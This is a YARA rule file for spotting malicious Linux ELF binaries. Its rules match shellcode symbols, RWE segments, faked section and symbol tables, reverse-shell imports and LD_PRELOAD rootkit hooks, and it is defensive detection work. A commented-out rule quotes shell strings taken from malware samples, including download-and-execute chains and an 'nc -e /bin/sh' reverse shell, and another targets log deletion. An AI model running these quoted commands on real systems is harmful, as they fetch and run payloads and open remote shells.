import "elf"
import "math"
include "rules/magics.yar"


// private rule elf_no_sections {
//   condition:
//     is_elf and elf.number_of_sections == 0
// }

rule Shellcode_Executor
{
  // meta:
  //   description = "Try to detect shellcode executor by exported \"shellcode\" string"
  condition:
    // There is a false positive from yara name matching. Condition elf.symtab[i].name == "buf" matched
    // any object name contains "buf" like "xxxbuf"
    // False positive: /usr/lib/debug/.build-id/2e/5abcee94f3bcbed7bba094f341070a2585a2ba.debug
    // False positive /usr/lib/modules/5.16.0-12parrot1-amd64/kernel/drivers/accessibility/speakup/speakup.ko
    elf_exec and for any i in (0 .. elf.symtab_entries): (
      (elf.symtab[i].name == "shellcode" or elf.symtab[i].name == "code") and elf.symtab[i].type == elf.STT_OBJECT
    )
}

// rule SusELF_NoSects {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Suspicious ELF files. File has no section and file size < 1KB. Usually see by Metasploit's stageless payloads"
//   condition:
//     elf_no_sections and filesize < 1KB
// }

rule ELF_LoadRWE
{
  // meta:
  //   description = "Flags binaries with a single LOAD segment marked as RWE."
  //   family = "Stager"
  //   filetype = "ELF"
  //   hash = "711a06265c71a7157ef1732c56e02a992e56e9d9383ca0f6d98cd96a30e37299"
  //   reference = "https://github.com/tenable/yara-rules/blob/master/generic/elf_format.yar#L3"
  //   reference = "https://www.tenable.com/blog/hunting-linux-malware-with-yara"
  condition:
    elf.number_of_segments == 1 and
    elf.segments[0].type == elf.PT_LOAD and
    elf.segments[0].flags == elf.PF_R | elf.PF_W | elf.PF_X
}


rule ELF_FakeDynSym {
  // meta:
  //   description = "A fake dynamic symbol table has been added to the binary"
  //   family = "Obfuscation"
  //   filetype = "ELF"
  //   hash = "51676ae7e151a0b906c3a8ad34f474cb5b65eaa3bf40bb09b00c624747bcb241"
  //   reference = "https://github.com/tenable/yara-rules/blob/master/generic/elf_format.yar#L47"
  condition:
    elf_exec and
    elf.entry_point < filesize and // file scanning only
    elf.number_of_sections > 0 and
    elf.dynamic_section_entries > 0 and
    for any i in (0..elf.dynamic_section_entries):
    (
      elf.dynamic[i].type == elf.DT_SYMTAB and
      not
      (
        for any j in (0..elf.number_of_sections):
        (
          elf.sections[j].type == elf.SHT_DYNSYM and
          for any k in (0..elf.number_of_segments):
          (
            (elf.segments[k].virtual_address <= elf.dynamic[i].val) and
            ((elf.segments[k].virtual_address + elf.segments[k].file_size) >= elf.dynamic[i].val) and
            (elf.segments[k].offset + (elf.dynamic[i].val - elf.segments[k].virtual_address)) == elf.sections[j].offset
          )
        )
      )
    )
}

rule ELF_FakeSectionHdrs {
  // meta:
  //   description = "A fake sections header has been added to the binary."
  //   family = "Obfuscation"
  //   filetype = "ELF"
  //   hash = "a2301180df014f216d34cec8a6a6549638925ae21995779c2d7d2827256a8447"
  //   reference = "https://github.com/tenable/yara-rules/blob/master/generic/elf_format.yar#L17"
  condition:
    elf_exec and
    elf.entry_point < filesize and // file scanning only
    elf.number_of_segments > 0 and
    elf.number_of_sections > 0 and
    not
    (
      for any i in (0..elf.number_of_segments):
      (
        (elf.segments[i].offset <= elf.entry_point) and
        ((elf.segments[i].offset + elf.segments[i].file_size) >= elf.entry_point) and
        for any j in (0..elf.number_of_sections):
        (
          elf.sections[j].offset <= elf.entry_point and
          ((elf.sections[j].offset + elf.sections[j].size) >= elf.entry_point) and
          (elf.segments[i].virtual_address + (elf.entry_point - elf.segments[i].offset)) ==
          (elf.sections[j].address + (elf.entry_point - elf.sections[j].offset))
        )
      )
    )
}

// rule SusELF_SectHighEntropy {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Check high entropy in file's section"
//   condition:
//     is_elf and
//     math.entropy(elf.sections[0].offset, elf.sections[elf.number_of_sections - 1].offset + elf.sections[elf.number_of_sections - 1].size) >= 7.4
//     // for any i in (0 .. elf.number_of_sections):
//     // (
//     //   math.entropy(elf.sections[i].offset, elf.sections[i].size) >= 7.4
//     // )
// }

/*
  code from clamav
  1. broken class
  2. program header num > 128 (32 bits and 64 bits)
  3. sizeof(struct elf_program_hdr32)) != sizeof(struct elf_program_hdr32) can't read section header. Same for 64 bits
  4. Can't calculate entry point
*/

// rule ELF_NoEntryPoint {
//   // meta:
//   //   description = "Detect ELF file that has no entry point. Memory scan will not match."
//   strings:
//     // Magic string of ELF type EXEC
//     $magic = {7f 45 4c 46 [12] 02}
//   condition:
//     $magic at 0 and not defined elf.entry_point
// }

rule ImportFuncs_Backdoor {
  // meta:
  //   descriptions = "Common imports by remote shell. Usually simple reverse tcp"
    // Doesn't work when scan processes
    /* Falsee positives
    SusELF_BackdoorImp /usr/bin//tcpliveplay
    SusELF_BackdoorImp /usr/bin//tcpprep
    SusELF_BackdoorImp /usr/bin//tcpbridge
    SusELF_BackdoorImp /usr/bin//tcpreplay
    SusELF_BackdoorImp /usr/bin//tcpreplay-edit
    SusELF_BackdoorImp /usr/bin//tcprewrite
    */
  condition:
    elf_magic and elf.dynsym_entries < 2000 and
    (
      for 1 i in (0 .. elf.dynsym_entries):
      (
        elf.dynsym[i].type == elf.STT_FUNC and
        (
          elf.dynsym[i].name == "execl" or
          elf.dynsym[i].name == "execve" or
          elf.dynsym[i].name == "execvle" or
          elf.dynsym[i].name == "execvp" or
          elf.dynsym[i].name == "execv" or
          elf.dynsym[i].name == "execlp" or
          elf.dynsym[i].name == "system"
        )
      )
    ) and
    (
      for 1 i in (0 .. elf.dynsym_entries):
      (
        elf.dynsym[i].type == elf.STT_FUNC and
        (
          elf.dynsym[i].name == "htons" or
          elf.dynsym[i].name == "htonl"
        )
      )
    ) and
    (
      for 1 i in (0 .. elf.dynsym_entries):
      (
        elf.dynsym[i].type == elf.STT_FUNC and
        (
          elf.dynsym[i].name == "dup" or
          elf.dynsym[i].name == "dup2" or
          elf.dynsym[i].name == "dup3"
        )
      )
    )
}

/* Some common imports used by ld preload by comparing some samples (the -- is the extra functions in the function's family)
access
dlsym
fclose
fgets
fopen
-- fopen64
fputs
lstat
__lxstat
__lxstat64
open
opendir
-- opendir64
readdir
-- readdir64
strcmp
strstr
tmpfile
unlink
unlinkat
*/


rule ImportFuncs_PreLRootkit {
  // meta:
  //   description = "Find DYN ELF bins that imports common function LD_PRELOAD rootkits hook"
  condition:
    // FIXME false positive libc-2.31.so in libc-i386. This object file doesn't have dlsym and access
    elf_dyn and (
      for 7 i in (0 .. elf.dynsym_entries):
      (
        elf.dynsym[i].type == elf.STT_FUNC and
        (
          elf.dynsym[i].name == "access" or
          elf.dynsym[i].name == "dlsym" or
          elf.dynsym[i].name == "fopen" or
          elf.dynsym[i].name == "lstat" or
          elf.dynsym[i].name == "strstr" or
          elf.dynsym[i].name == "tmpfile" or
          elf.dynsym[i].name == "unlink"
        )
      )
    )
}

// rule SusElf_PyCompiled {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//   condition:
//     is_elf and for any i in (0 .. elf.symtab_entries):
//     (
//       elf.symtab[i].type == elf.STT_FUNC and elf.symtab[i].name == "PyCode_New"
//     )
// }

// rule OSCommand_Syslog_Removal {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Bash command to remove everything in /var/log/"
//     date = "12/11/2021"
//     refrence = "https://otx.alienvault.com/indicator/file/6138054a7de11c23b5c26755d7548c4096fa547cbb964ac78ef0fbe59d16c2da"
//   strings:
//     $ = /rm(\/var\/log[\S\/ \-]+|\-rf|[ ])+/
//   condition:
//     all of them
// }


// rule SuspiciousEnvironmentVariable {
//   // Malicious exports:
//   //  export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s
//     // export HOME=/tmp;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&
//     // export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;%s
//     // export fileGet=busybox;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/"$fileGet" ] || [ ! -s /var/"$fileGet" ]) && tftp -g -r "$fileGet" %s && chmod +x "$fileGet" && ./"$fileGet" mkdir bin && ./"$fileGet" --install -s /var/bin && ls -l "$fileGet" || echo It appears we already have /var/"$fileGet")
//     // export fileGet=busybox;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/"$fileGet" ] || [ ! -s /var/"$fileGet" ]) && tftp -g -r "$fileGet" %s && chmod +x "$fileGet" && ./"$fileGet" mkdir bin && ./"$fileGet" --install -s /var/bin && ls -l "$fileGet" || echo It appears we already have /var/"$fileGet")
//     // export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo "$url" | sed 's#.*/##'`;(([ ! -e /var/bin/$name ] || [ ! -s /var/bin/$name ]) && echo "$name either doesnt exist or eq 0 so we get" && cd /tmp && wget -O "$name" "$url" && chmod +x "$name" && mv "$name" /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo "It appears I already have $name")
//     // export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo "$url" | sed 's#.*/##'`;([ -e /var/bin/$name ]) && echo $name exists so we delete it... && rm /var/bin/$name && cd /tmp && wget -O $name $url && chmod +x $name && mv $name /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo "$name doesnt exist, perhaps you mean INSTALL?"
//     // export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;export HOME=/tmp;[ ! -f /var/bin/bd ] && cd /var/bin;wget -O bd %s;chmod +x /var/bin/bd;(killall -9 telnetd || kill -9 telnetd) && (nohup bd || trap '' 1 2 /var/bin/bd &)
//     // export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;trap '' 1 2; sh -c 'nc %s -e /bin/sh '&
//     // export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;(([ ! -x /var/bin/scan ] || [ ! -x /var/bin/nmap ]) && echo "I am missing either scan or nmap, and Shellzrus was on Xanax when he wrote this, so you need to do INSTALL http:/server/nmap and INSTALL http://server/scan first..." && ([ -f /var/bin/nmap ] && ls -l /var/bin/nmap) && ([ -f /var/bin/scan ] && ls -l /var/bin/scan) || scan %s)
//     // export HOME=/tmp;export SHELL=/var/bin/bash;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;%s
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Regex to find suspicious environment variables"
//     date = "14/11/2021"
//     reference = "https://otx.alienvault.com/indicator/file/3e657fb9543777fea0f8399169a4dbb4b235213396bfd911e2322625f6f5a001"
//     hash = "553ac527d6a02a84c787fd529ea59ce1eb301ddfb180d89b9e62108d92894185"
//     hash = "305901aa920493695729132cfd20cbddc9db2cf861071450a646c6a07b4a50f3"
//     hash = "7a60c84fb34b2b3cd7eed3ecd6e4a0414f92136af656ed7d4460b8694f2357a7"
//     hash = "e2125d9ce884c0fb3674bd12308ed1c10651dc4ff917b5e393d7c56d7b809b87"
//   strings:
//     $ = /^(export [\w]+[=\/\w+:; '"%\.\(\)\-\[\]\`\!\$\|\&#\*,?]+)+$/
//   condition:
//     all of them
// }